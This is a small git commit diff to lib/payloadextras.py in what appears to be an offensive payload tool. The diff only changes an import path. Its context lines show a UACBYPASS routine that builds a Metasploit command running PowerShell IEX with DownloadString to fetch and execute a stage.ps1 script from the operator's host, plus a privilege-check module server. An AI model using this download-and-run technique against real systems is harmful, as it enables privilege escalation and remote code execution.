1965a18b6a4d687f4f5a5ab5a10eac7f35136e22
yiannosch <30556160+yiannosch@users.noreply.github.com>
2019-04-24 11:34:23 +0100

    Update payloadextras.py

--- lib/payloadextras.py
+++ lib/payloadextras.py
@@ -22,7 +22,7 @@ class EXTRAS(object):
             return self.shellcode
 
     def UACBYPASS(self, version):
-        from lib.menu import returnIP
+        from menu import returnIP
         randomPort = FUNCTIONS().randomUnusedPort()
         uacbypassrcfilecontents = """run post/windows/manage/exec_powershell SCRIPT="IEX (New-Object Net.WebClient).DownloadString('http://%s:%s/stage.ps1')" SESSION=1"""% (returnIP(), randomPort)
         moduleport = FUNCTIONS().randomUnusedPort()
@@ -45,7 +45,7 @@ class EXTRAS(object):
             return self.shellcode
 
     def ALLCHECKS(self):
-        from lib.menu import returnIP
+        from menu import returnIP
         moduleport = FUNCTIONS().randomUnusedPort()
         FUNCTIONS().DoServe(returnIP(), "", "./externalmodules", port = moduleport, printIt = False)
         with open('allchecks.ps1', 'w') as allchecksfile:
